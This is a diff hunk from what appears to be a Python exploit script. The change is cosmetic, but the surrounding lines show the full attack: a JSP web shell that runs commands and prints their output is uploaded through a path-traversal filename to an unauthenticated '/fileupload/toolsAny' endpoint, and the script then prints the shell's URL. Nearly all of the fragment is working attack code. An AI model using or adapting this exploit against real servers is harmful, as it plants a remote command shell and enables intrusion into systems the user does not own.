@@ -26,6 +26,8 @@ InputStreamReader(p.getInputStream()));
 %>
         <pre><%=output %></pre>"""
 
-files = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/{file}": shell}
-response = requests.post(f'{host}/fileupload/toolsAny', files=files, verify=False)
+files = {
+    f"../../../../repository/deployment/server/webapps/authenticationendpoint/{file}": shell
+}
+response = requests.post(f"{host}/fileupload/toolsAny", files=files, verify=False)
 print(f"shell @ {host}/authenticationendpoint/{file}")
